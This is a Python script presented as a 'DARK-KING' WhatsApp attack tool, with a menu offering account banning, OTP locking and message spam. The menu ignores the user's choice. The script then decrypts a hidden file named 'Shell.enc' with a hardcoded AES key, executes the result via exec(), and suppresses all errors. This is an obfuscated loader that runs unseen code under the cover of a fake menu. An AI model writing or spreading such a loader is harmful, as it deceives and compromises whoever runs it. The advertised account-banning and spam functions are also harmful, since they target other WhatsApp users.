import os
from base64 import b64decode
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad
from colorama import Fore, Style, init

init(autoreset=True)

ENC_FILE = "Shell.enc"
KEY = b64decode("LrzLae/iO/QTu109CcAgw2Qxuxc+uftJk68cicdVXkU=")  # 32 bytes
BLOCK_SIZE = AES.block_size

def show_menu():
    os.system("clear")

    # Devil ASCII Logo
    logo = f"""
{Fore.RED}
      
     .--------.
    / .------. \
   / /        \ \
   | |        | |
  _| |________| |_
.' |_|        |_| '.
'._____ ____ _____.'
|     .'____'.     |
'.__.'.'    '.'.__.'
'.__  | KING |  __.'
|   '.'.____.'.'   |
'.____'.____.'____.'DARK-KING
'.________________.'


{Style.RESET_ALL}
"""

    print(logo)
    print(Fore.CYAN + Style.BRIGHT + "         Developed by D4RK-K1NG\n")

    # Menu Box
    print(Fore.YELLOW + "╔══════════════════════════════╗")
    print("║           " + Fore.RED + Style.BRIGHT + "ＭＥＮＵ" + Fore.YELLOW + "           ║")
    print("╠══════════════════════════════╣")
    print("║  " + Fore.GREEN + "1." + Fore.WHITE + " WhatsApp-Ban             " + Fore.YELLOW + "║")
    print("║  " + Fore.GREEN + "2." + Fore.WHITE + " Wa-OTP Lock             " + Fore.YELLOW + "║")
    print("║  " + Fore.GREEN + "3." + Fore.WHITE + " wa-msg Spam              " + Fore.YELLOW + "║")
    print("╚══════════════════════════════╝" + Style.RESET_ALL)

    input(Fore.CYAN + "Choose any option > " + Style.RESET_ALL)


def decrypt_and_run():
    with open(ENC_FILE, "rb") as f:
        data = f.read()
    iv = data[:BLOCK_SIZE]
    ct = data[BLOCK_SIZE:]
    cipher = AES.new(KEY, AES.MODE_CBC, iv)
    decrypted_code = unpad(cipher.decrypt(ct), BLOCK_SIZE).decode("utf-8")
    exec(decrypted_code, {"__name__": "__main__"})


if __name__ == "__main__":
    try:
        show_menu()
        decrypt_and_run()
    except Exception:
        pass
